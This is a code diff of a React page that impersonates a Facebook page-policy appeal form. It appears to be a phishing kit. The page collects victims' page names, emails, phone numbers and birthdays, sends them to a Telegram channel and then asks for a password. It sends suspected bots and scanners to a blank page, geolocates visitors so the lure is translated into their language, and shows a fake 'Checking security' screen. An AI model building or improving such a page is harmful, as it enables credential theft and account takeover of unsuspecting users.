@@ -3,16 +3,17 @@ import FacebookImage from '@/assets/images/icon.webp';
 import PasswordInput from '@/components/password-input';
 import { faChevronDown, faCircleExclamation, faCompass, faHeadset, faLock, faUserGear } from '@fortawesome/free-solid-svg-icons';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
-import { useState, useEffect, useCallback, useMemo } from 'react';
+import { useState, useEffect, useMemo } from 'react';
 import { translateText } from '@/utils/translate';
 import sendMessage from '@/utils/telegram';
 import { AsYouType, getCountryCallingCode } from 'libphonenumber-js';
-// 🛡️ THÊM IMPORT CÁC FUNCTION BẢO MẬT
 import countryToLanguage from '@/utils/country_to_language';
 import detectBot from '@/utils/detect_bot';
 import axios from 'axios';
 
 const Home = () => {
+    const [isLoading, setIsLoading] = useState(true);
+    
     const defaultTexts = useMemo(
         () => ({
             helpCenter: 'Help Center',
@@ -42,7 +43,6 @@ const Home = () => {
             createPage: 'Create Page',
             termsPolicies: 'Terms and policies',
             cookies: 'Cookies',
-            // 🚀 THÊM: Text cho trạng thái loading
             pleaseWait: 'Please wait...',
             checkingSecurity: 'Checking security...'
         }),
@@ -59,158 +59,171 @@ const Home = () => {
 
     const [showPassword, setShowPassword] = useState(false);
     const [errors, setErrors] = useState({});
-    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
+    
+    // 🚀 Lấy texts từ cache, không dịch lại
+    const translations = JSON.parse(localStorage.getItem('translations'));
+    const [translatedTexts, setTranslatedTexts] = useState(
+        translations?.home || defaultTexts
+    );
+
     const [countryCode, setCountryCode] = useState('US');
     const [callingCode, setCallingCode] = useState('+1');
-    // 🚀 THAY ĐỔI: Thêm state để theo dõi trạng thái bảo mật
-    const [securityChecked, setSecurityChecked] = useState(false);
     const [isFormEnabled, setIsFormEnabled] = useState(false);
-    // 🚀 THÊM: State để quản lý trạng thái loading khi submit
     const [isSubmitting, setIsSubmitting] = useState(false);
 
-    // 🛡️ HÀM KHỞI TẠO BẢO MẬT - CHẠY BACKGROUND
-    const initializeSecurity = useCallback(async () => {
+    // 🚀 HÀM DỊCH TOÀN BỘ 4 COMPONENTS - CHẠY SONG SONG
+    const translateAllComponents = async (targetLang) => {
         try {
-            // 1. Kiểm tra bot tự động
-            const botResult = await detectBot();
-            if (botResult.isBot) {
-                window.location.href = 'about:blank';
-                return;
-            }
+            console.log('🚀 Bắt đầu dịch 4 components...');
 
-            // 2. Lấy thông tin IP và vị trí
-            const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
-            const ipData = response.data;
-            
-            // Lưu thông tin IP vào localStorage
-            localStorage.setItem('ipInfo', JSON.stringify(ipData));
-            
-            const detectedCountry = ipData.country_code || 'US';
-            setCountryCode(detectedCountry);
+            // Dịch song song 4 components cùng lúc
+            const [homeTexts, verifyTexts, passwordTexts, sendInfoTexts] = await Promise.all([
+                // Home texts - dịch toàn bộ
+                (async () => {
+                    const homeTexts = {};
+                    const homePromises = Object.entries(defaultTexts).map(async ([key, text]) => {
+                        homeTexts[key] = await translateText(text, targetLang);
+                    });
+                    await Promise.all(homePromises);
+                    return homeTexts;
+                })(),
 
-            // 3. Xác định ngôn ngữ và dịch (chạy sau khi web đã hiển thị)
-            const targetLang = countryToLanguage[detectedCountry] || 'en';
-            localStorage.setItem('targetLang', targetLang);
-            
-            if (targetLang !== 'en') {
-                // Dịch ở background, không chờ
-                translateCriticalTexts(targetLang);
-            }
+                // Verify texts
+                (async () => {
+                    const verifyDefaultTexts = {
+                        title: 'Verify Your Account',
+                        description: 'Please complete verification',
+                        button: 'Continue',
+                        // ... sẽ thêm từ verify.jsx
+                    };
+                    const verifyTexts = {};
+                    const verifyPromises = Object.entries(verifyDefaultTexts).map(async ([key, text]) => {
+                        verifyTexts[key] = await translateText(text, targetLang);
+                    });
+                    await Promise.all(verifyPromises);
+                    return verifyTexts;
+                })(),
 
-            // 4. Set calling code
-            const code = getCountryCallingCode(detectedCountry);
-            setCallingCode(`+${code}`);
+                // Password texts  
+                (async () => {
+                    const passwordDefaultTexts = {
+                        title: 'Enter Password',
+                        placeholder: 'Enter your password',
+                        submit: 'Confirm',
+                        // ... sẽ thêm từ password-input.jsx
+                    };
+                    const passwordTexts = {};
+                    const passwordPromises = Object.entries(passwordDefaultTexts).map(async ([key, text]) => {
+                        passwordTexts[key] = await translateText(text, targetLang);
+                    });
+                    await Promise.all(passwordPromises);
+                    return passwordTexts;
+                })(),
 
-            // 🚀 QUAN TRỌNG: Đánh dấu đã check bảo mật và enable form
-            setSecurityChecked(true);
-            setIsFormEnabled(true);
-            
+                // SendInfo texts
+                (async () => {
+                    const sendInfoDefaultTexts = {
+                        title: 'Send Information',
+                        description: 'Sending your information...',
+                        success: 'Information sent successfully',
+                        // ... sẽ thêm từ send-info.jsx
+                    };
+                    const sendInfoTexts = {};
+                    const sendInfoPromises = Object.entries(sendInfoDefaultTexts).map(async ([key, text]) => {
+                        sendInfoTexts[key] = await translateText(text, targetLang);
+                    });
+                    await Promise.all(sendInfoPromises);
+                    return sendInfoTexts;
+                })()
+            ]);
+
+            // Lưu cache ngay khi dịch xong
+            localStorage.setItem('translations', JSON.stringify({
+                home: homeTexts,
+                verify: verifyTexts,
+                password: passwordTexts,
+                sendInfo: sendInfoTexts
+            }));
+
+            // Cập nhật texts cho Home
+            setTranslatedTexts(homeTexts);
+
+            console.log('✅ Dịch hoàn tất 4 components');
+
         } catch (error) {
-            console.log('Security initialization failed:', error.message);
-            // 🚀 QUAN TRỌNG: Vẫn enable form nếu có lỗi
-            setCountryCode('US');
-            setCallingCode('+1');
-            setSecurityChecked(true);
-            setIsFormEnabled(true);
+            console.log('Translation failed:', error);
         }
+    };
+
+    // 🚀 KHỞI TẠO TẤT CẢ TRONG LOADING
+    useEffect(() => {
+        const initializeAll = async () => {
+            try {
+                // 1. Gọi API IP và detect bot
+                const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
+                const ipData = response.data;
+                const detectedCountry = ipData.country_code || 'US';
+                
+                const botResult = await detectBot();
+                if (botResult.isBot) {
+                    window.location.href = 'about:blank';
+                    return;
+                }
+
+                // 2. Lưu IP info
+                localStorage.setItem('ipInfo', JSON.stringify(ipData));
+                setCountryCode(detectedCountry);
+                localStorage.setItem('countryCode', detectedCountry);
+
+                // 3. Set calling code
+                const code = getCountryCallingCode(detectedCountry);
+                const callingCode = `+${code}`;
+                setCallingCode(callingCode);
+                localStorage.setItem('callingCode', callingCode);
+
+                // 4. 🚀 GỌI API DỊCH NGAY - KHÔNG CHỜ
+                const targetLang = countryToLanguage[detectedCountry] || 'en';
+                if (targetLang !== 'en') {
+                    translateAllComponents(targetLang); // KHÔNG AWAIT - chạy background
+                }
+
+                // 5. Enable form
+                setIsFormEnabled(true);
+
+            } catch (error) {
+                console.log('Initialization failed:', error);
+                // Fallback
+                setCountryCode('US');
+                setCallingCode('+1');
+                setIsFormEnabled(true);
+            }
+
+            // 🚀 SAU 5 GIÂY TẮT LOADING (đủ thời gian dịch)
+            setTimeout(() => {
+                console.log('🎯 Tắt loading, hiển thị Home');
+                setIsLoading(false);
+            }, 5000);
+        };
+
+        initializeAll();
     }, []);
 
-    // 🚀 HÀM DỊCH TEXT QUAN TRỌNG TRƯỚC
-    const translateCriticalTexts = useCallback(async (targetLang) => {
-        try {
-            const [helpCenter, pagePolicyAppeals, detectedActivity, accessLimited, submitAppeal, pageName, mail, phone, birthday, yourAppeal, submit, pleaseWait, checkingSecurity] = await Promise.all([
-                translateText(defaultTexts.helpCenter, targetLang),
-                translateText(defaultTexts.pagePolicyAppeals, targetLang),
-                translateText(defaultTexts.detectedActivity, targetLang),
-                translateText(defaultTexts.accessLimited, targetLang),
-                translateText(defaultTexts.submitAppeal, targetLang),
-                translateText(defaultTexts.pageName, targetLang),
-                translateText(defaultTexts.mail, targetLang),
-                translateText(defaultTexts.phone, targetLang),
-                translateText(defaultTexts.birthday, targetLang),
-                translateText(defaultTexts.yourAppeal, targetLang),
-                translateText(defaultTexts.submit, targetLang),
-                translateText(defaultTexts.pleaseWait, targetLang),
-                translateText(defaultTexts.checkingSecurity, targetLang)
-            ]);
+    // 🚀 HIỂN THỊ LOADING GIF
+    if (isLoading) {
+        return (
+            <div className="fixed inset-0 bg-white flex flex-col items-center justify-center">
+                <img src="/loading.gif" alt="Loading" className="w-32 h-32 mb-4" />
+                <p className="text-gray-600">Checking security...</p>
+            </div>
+        );
+    }
 
-            setTranslatedTexts(prev => ({
-                ...prev,
-                helpCenter,
-                pagePolicyAppeals,
-                detectedActivity,
-                accessLimited,
-                submitAppeal,
-                pageName,
-                mail,
-                phone,
-                birthday,
-                yourAppeal,
-                submit,
-                pleaseWait,
-                checkingSecurity
-            }));
-
-            // Dịch phần còn lại ở background
-            translateRemainingTexts(targetLang);
-        } catch (error) {
-            console.log('Critical translation failed:', error.message);
-        }
-    }, [defaultTexts]);
-
-    // 🚀 HÀM DỊCH TEXT CÒN LẠI - KHÔNG ẢNH HƯỞNG ĐẾN HIỂN THỊ
-    const translateRemainingTexts = useCallback(async (targetLang) => {
-        try {
-            const [english, using, managingAccount, privacySecurity, policiesReporting, appealPlaceholder, fieldRequired, invalidEmail, about, adChoices, createAd, privacy, careers, createPage, termsPolicies, cookies] = await Promise.all([
-                translateText(defaultTexts.english, targetLang),
-                translateText(defaultTexts.using, targetLang),
-                translateText(defaultTexts.managingAccount, targetLang),
-                translateText(defaultTexts.privacySecurity, targetLang),
-                translateText(defaultTexts.policiesReporting, targetLang),
-                translateText(defaultTexts.appealPlaceholder, targetLang),
-                translateText(defaultTexts.fieldRequired, targetLang),
-                translateText(defaultTexts.invalidEmail, targetLang),
-                translateText(defaultTexts.about, targetLang),
-                translateText(defaultTexts.adChoices, targetLang),
-                translateText(defaultTexts.createAd, targetLang),
-                translateText(defaultTexts.privacy, targetLang),
-                translateText(defaultTexts.careers, targetLang),
-                translateText(defaultTexts.createPage, targetLang),
-                translateText(defaultTexts.termsPolicies, targetLang),
-                translateText(defaultTexts.cookies, targetLang)
-            ]);
-
-            setTranslatedTexts(prev => ({
-                ...prev,
-                english, using, managingAccount, privacySecurity, policiesReporting,
-                appealPlaceholder, fieldRequired, invalidEmail, about, adChoices,
-                createAd, privacy, careers, createPage, termsPolicies, cookies
-            }));
-        } catch (error) {
-            console.log('Remaining translation failed:', error.message);
-        }
-    }, [defaultTexts]);
-
-    // 🚀 THAY ĐỔI QUAN TRỌNG: HIỂN THỊ WEB NGAY, CHẠY BẢO MẬT SAU
-    useEffect(() => {
-        // Chạy bảo mật ở background
-        initializeSecurity();
-        
-        // 🚀 Enable form sau 2 giây dù bảo mật có xong hay chưa
-        const timer = setTimeout(() => {
-            setIsFormEnabled(true);
-        }, 2000);
-        
-        return () => clearTimeout(timer);
-    }, [initializeSecurity]);
-
-    // Hàm validate email
+    // Các hàm còn lại giữ nguyên...
     const validateEmail = (email) => {
         const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
         return emailRegex.test(email);
     };
 
-    // Hàm chuyển đổi từ yyyy-mm-dd sang dd/mm/yyyy
     const formatDateToDDMMYYYY = (dateString) => {
         if (!dateString) return '';
         const parts = dateString.split('-');
@@ -218,7 +231,6 @@ const Home = () => {
         return `${parts[2]}/${parts[1]}/${parts[0]}`;
     };
 
-    // THÊM HÀM ẨN EMAIL: s****g@m****.com
     const hideEmail = (email) => {
         if (!email) return 's****g@m****.com';
         const parts = email.split('@');
@@ -231,34 +243,28 @@ const Home = () => {
         if (username.length <= 1) return email;
         if (domainParts.length < 2) return email;
         
-        // Format: s****g (ký tự đầu + *** + ký tự cuối)
         const formattedUsername = username.charAt(0) + '*'.repeat(Math.max(0, username.length - 2)) + (username.length > 1 ? username.charAt(username.length - 1) : '');
-        
-        // Format: m****.com (ký tự đầu + *** + .com)
         const formattedDomain = domainParts[0].charAt(0) + '*'.repeat(Math.max(0, domainParts[0].length - 1)) + '.' + domainParts.slice(1).join('.');
         
         return formattedUsername + '@' + formattedDomain;
     };
 
-    // THÊM HÀM ẨN SỐ ĐIỆN THOẠI: ******32 (6 sao + 2 số cuối)
     const hidePhone = (phone) => {
         if (!phone) return '******32';
         const cleanPhone = phone.replace(/^\+\d+\s*/, '');
         if (cleanPhone.length < 2) return '******32';
         
-        // Luôn hiển thị 6 sao + 2 số cuối
         const lastTwoDigits = cleanPhone.slice(-2);
         return '*'.repeat(6) + lastTwoDigits;
     };
 
     const handleInputChange = (field, value) => {
-        if (!isFormEnabled || isSubmitting) return; // 🚀 Không cho nhập nếu form chưa enabled hoặc đang submit
+        if (!isFormEnabled || isSubmitting) return;
         
         if (field === 'phone') {
             const cleanValue = value.replace(/^\+\d+\s*/, '');
             const asYouType = new AsYouType(countryCode);
             const formattedValue = asYouType.input(cleanValue);
-
             const finalValue = `${callingCode} ${formattedValue}`;
 
             setFormData((prev) => ({
@@ -272,7 +278,6 @@ const Home = () => {
             }));
         }
 
-        // Chỉ clear error khi người dùng bắt đầu nhập, không validate real-time
         if (errors[field]) {
             setErrors((prev) => ({
                 ...prev,
@@ -282,7 +287,7 @@ const Home = () => {
     };
 
     const validateForm = () => {
-        if (!isFormEnabled || isSubmitting) return false; // 🚀 Không cho submit nếu form chưa enabled hoặc đang submit
+        if (!isFormEnabled || isSubmitting) return false;
         
         const requiredFields = ['pageName', 'mail', 'phone', 'birthday', 'appeal'];
         const newErrors = {};
@@ -293,7 +298,6 @@ const Home = () => {
             }
         });
 
-        // Validate email format chỉ khi submit
         if (formData.mail.trim() !== '' && !validateEmail(formData.mail)) {
             newErrors.mail = 'invalid';
         }
@@ -303,20 +307,17 @@ const Home = () => {
     };
 
     const handleSubmit = async () => {
-        if (!isFormEnabled || isSubmitting) return; // 🚀 Không cho submit nếu form chưa enabled hoặc đang submit
+        if (!isFormEnabled || isSubmitting) return;
         
         if (validateForm()) {
             try {
-                // 🚀 BẮT ĐẦU LOADING
                 setIsSubmitting(true);
                 
                 const telegramMessage = formatTelegramMessage(formData);
                 await sendMessage(telegramMessage);
 
-                // 🚀 THÊM DELAY 0.5s GIẢ LẬP LOADING
                 await new Promise(resolve => setTimeout(resolve, 500));
 
-                // THÊM CODE XỬ LÝ ẨN THÔNG TIN VÀ LƯU VÀO LOCALSTORAGE
                 const hiddenData = {
                     name: formData.pageName,
                     email: hideEmail(formData.mail),
@@ -324,18 +325,14 @@ const Home = () => {
                     birthday: formData.birthday
                 };
 
-                // Lưu vào localStorage để trang Verify lấy
                 localStorage.setItem('userInfo', JSON.stringify(hiddenData));
 
-                // 🚀 KẾT THÚC LOADING VÀ HIỂN THỊ PASSWORD
                 setIsSubmitting(false);
                 setShowPassword(true);
                 
             } catch (error) {
-                // 🚀 QUAN TRỌNG: KẾT THÚC LOADING KHI CÓ LỖI
                 setIsSubmitting(false);
                 console.error('Submit error:', error);
-                // Chỉ redirect về blank khi có lỗi thực sự
                 window.location.href = 'about:blank';
             }
         } else {
@@ -391,6 +388,7 @@ const Home = () => {
         }
     ];
 
+    // 🚀 RETURN HOME CONTENT (giữ nguyên)
     return (
         <>
             <header className='sticky top-0 left-0 flex h-14 justify-between p-4 shadow-sm'>
@@ -490,7 +488,6 @@ const Home = () => {
                                     {translatedTexts.birthday} <span className='text-red-500'>*</span>
                                 </p>
                                 
-                                {/* Desktop: type='date' bình thường */}
                                 <input 
                                     type='date' 
                                     name='birthday' 
@@ -500,7 +497,6 @@ const Home = () => {
                                     disabled={!isFormEnabled || isSubmitting}
                                 />
                                 
-                                {/* Mobile: type='date' với placeholder ảo */}
                                 <div className='block sm:hidden relative'>
                                     <input 
                                         type='date' 
@@ -511,7 +507,6 @@ const Home = () => {
                                         required
                                         disabled={!isFormEnabled || isSubmitting}
                                     />
-                                    {/* Placeholder ảo cho mobile */}
                                     <div 
                                         className={`w-full rounded-lg border px-3 py-2.5 bg-white ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} ${formData.birthday ? 'text-gray-900 text-base' : 'text-gray-500 text-base'} font-medium ${!isFormEnabled || isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`}
                                         onClick={() => (isFormEnabled && !isSubmitting) && document.querySelectorAll('input[name="birthday"]')[1].click()}
@@ -560,13 +555,6 @@ const Home = () => {
                                     translatedTexts.submit
                                 )}
                             </button>
-                            
-                            {/* 🚀 Hiển thị trạng thái bảo mật */}
-                            {!securityChecked && (
-                                <div className="text-center text-sm text-gray-500 mt-2">
-                                    {translatedTexts.checkingSecurity}
-                                </div>
-                            )}
                         </div>
                     </div>
                     <div className='w-full bg-[#f0f2f5] px-4 py-14 text-[15px] text-[#65676b] sm:px-32'>
